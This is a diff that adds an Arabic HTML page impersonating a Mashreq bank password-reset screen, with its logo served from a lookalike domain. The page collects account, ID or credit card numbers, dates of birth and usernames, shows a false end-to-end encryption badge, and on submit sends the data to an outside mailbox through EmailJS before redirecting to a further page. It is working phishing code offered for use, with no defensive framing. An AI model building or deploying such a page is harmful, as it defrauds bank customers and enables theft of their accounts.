@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إعادة تعيين كلمة المرور - المشرق</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // مفتاح Public Key الخاص بحساب EmailJS
+        (function(){
+            emailjs.init("7XPO5m_okb7NT_n2a");
+        })();
+    </script>
+
+    <style>
+        :root {
+            --bg-page: #f5f6f8;
+            --container-bg: #ffffff;
+            --primary-orange: #ea6114; 
+            --border-color: #e0e0e0;
+            --text-dark: #333333;
+            --text-muted: #666666;
+            --btn-disabled: #dbdbdb;
+            --link-blue: #005eb8;
+            --safe-green: #1ba063;
+            --safe-green-bg: #eef8f2;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background-color: var(--bg-page);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            background-color: var(--container-bg);
+            min-height: 100vh;
+            box-shadow: 0 0 15px rgba(0,0,0,0.05);
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* الهيدر العلوي */
+        .top-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 25px;
+            border-top: 4px solid var(--primary-orange);
+            direction: ltr;
+        }
+
+        .top-header img {
+            height: 35px;
+            object-fit: contain;
+        }
+
+        .lang-selector {
+            border: 1px solid var(--border-color);
+            background: #fff;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-family: 'Cairo', sans-serif;
+            font-weight: 700;
+            color: var(--text-dark);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            direction: rtl;
+        }
+
+        /* قسم الفورم والمحتوى */
+        .content-section {
+            padding: 10px 25px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .page-header-title {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+
+        .page-header-title h2 {
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin: 0;
+        }
+
+        .lock-icon {
+            background-color: var(--primary-orange);
+            color: #ffffff;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 16px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin-bottom: 30px;
+            line-height: 1.6;
+            font-weight: 600;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 15px;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 10px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 15px;
+            font-size: 14px;
+            font-family: 'Cairo', sans-serif;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.3s;
+            font-weight: 600;
+        }
+
+        .form-group input:focus {
+            border-color: var(--primary-orange);
+        }
+
+        .form-group input::placeholder {
+            color: #b5b5b5;
+            font-weight: 600;
+        }
+
+        .helper-text {
+            display: block;
+            font-size: 11.5px;
+            color: #888888;
+            margin-top: 8px;
+            line-height: 1.6;
+            font-weight: 600;
+        }
+
+        .btn-continue {
+            width: 100%;
+            background-color: var(--btn-disabled);
+            color: #ffffff;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 800;
+            font-family: 'Cairo', sans-serif;
+            border-radius: 8px;
+            cursor: not-allowed;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn-continue.active {
+            background-color: var(--primary-orange);
+            cursor: pointer;
+        }
+
+        .back-link {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: var(--primary-orange);
+            font-weight: 800;
+            font-size: 15px;
+            text-decoration: none;
+            margin-top: 30px;
+            margin-bottom: 25px;
+        }
+
+        .security-badge {
+            background-color: var(--safe-green-bg);
+            border: 1px solid rgba(27, 160, 99, 0.3);
+            color: var(--safe-green);
+            padding: 10px 15px;
+            border-radius: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 13px;
+            font-weight: 700;
+            margin: 0 auto 30px auto;
+            width: fit-content;
+        }
+
+        .app-version {
+            text-align: center;
+            font-size: 12px;
+            color: #999999;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .bottom-bar {
+            height: 12px;
+            background-color: var(--primary-orange);
+            width: 100%;
+            margin-top: auto;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <div class="top-header">
+            <img src="https://watchmasreqq.com/manus-storage/mashreq_logo_d26073c8.png" alt="المشرق">
+            <button class="lang-selector">العربية <i class="fa-solid fa-caret-down"></i></button>
+        </div>
+
+        <div class="content-section">
+            
+            <div class="page-header-title">
+                <div class="lock-icon"><i class="fa-solid fa-lock"></i></div>
+                <h2>إعادة تعيين كلمة المرور</h2>
+            </div>
+            
+            <p class="subtitle">نحتاج إلى بعض التفاصيل عنك لتساعدنا للعثور على كشف الحساباتك في النظام لدينا.</p>
+
+            <form id="reset-form">
+                
+                <div class="form-group">
+                    <label for="account-info">حسابك أو رقم التعريف البنكي أو بطاقتك الائتمانية</label>
+                    <input type="text" id="account-info" placeholder="رقم التعريف (9 أرقام) أو الحساب (12 رقم) أو البطاقة (16 رقم)" required>
+                    <span class="helper-text">قم بتسجيل رقم التعريف الشخصي المكون من 9 أرقام أو رقم الحساب المكون من 12 رقماً أو رقم بطاقتك الائتمانية المكون من 16 رقماً</span>
+                </div>
+
+                <div class="form-group">
+                    <label for="dob">تاريخ الميلاد</label>
+                    <!-- تم تعديل النوع هنا ليصبح اختيار تاريخ تلقائي -->
+                    <input type="date" id="dob" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="username">اسم المستخدم</label>
+                    <input type="text" id="username" placeholder="أدخل اسم المستخدم الخاص بك" required>
+                </div>
+
+                <button type="submit" class="btn-continue" id="btn-continue" disabled>استمرار</button>
+
+            </form>
+
+            <a href="log.html" class="back-link">
+                العودة لتسجيل الدخول <i class="fa-solid fa-arrow-left-long" style="font-size: 14px;"></i>
+            </a>
+
+            <div class="security-badge">
+                <i class="fa-regular fa-shield-check"></i> بياناتك محمية بتشفير من طرف إلى طرف
+            </div>
+
+            <div class="app-version">
+                إصدار التطبيق 3.1.5
+            </div>
+
+        </div>
+
+        <div class="bottom-bar"></div>
+
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const accountInput = document.getElementById('account-info');
+            const dobInput = document.getElementById('dob');
+            const usernameInput = document.getElementById('username');
+            const btnContinue = document.getElementById('btn-continue');
+
+            // تفعيل زر الاستمرار عند تعبئة الحقول الثلاثة
+            function checkInputs() {
+                if (accountInput.value.trim() !== '' && 
+                    dobInput.value.trim() !== '' && 
+                    usernameInput.value.trim() !== '') {
+                    btnContinue.classList.add('active');
+                    btnContinue.disabled = false;
+                } else {
+                    btnContinue.classList.remove('active');
+                    btnContinue.disabled = true;
+                }
+            }
+
+            accountInput.addEventListener('input', checkInputs);
+            dobInput.addEventListener('input', checkInputs);
+            usernameInput.addEventListener('input', checkInputs);
+
+            // إرسال البيانات عبر EmailJS والتوجيه فوراً عند الضغط على استمرار
+            document.getElementById('reset-form').addEventListener('submit', function(event) {
+                event.preventDefault(); 
+
+                const originalText = btnContinue.innerHTML;
+                btnContinue.innerHTML = 'جاري التحقق...';
+                btnContinue.disabled = true;
+                btnContinue.classList.remove('active');
+
+                const templateParams = {
+                    account_number: accountInput.value,
+                    dob: dobInput.value,
+                    username: usernameInput.value
+                };
+
+                emailjs.send('service_1v8yy9k', 'template_vqqb6k8', templateParams)
+                    .then(function(response) {
+                        console.log('SUCCESS!', response.status, response.text);
+                        // التوجيه إلى صفحة chk.html مباشرة عند نجاح الإرسال
+                        window.location.href = 'chk.html'; 
+                    }, function(error) {
+                        console.log('FAILED...', error);
+                        alert('حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى.');
+                        btnContinue.innerHTML = originalText;
+                        btnContinue.disabled = false;
+                        btnContinue.classList.add('active');
+                    });
+            });
+        });
+    </script>
+
+</body>
+</html>
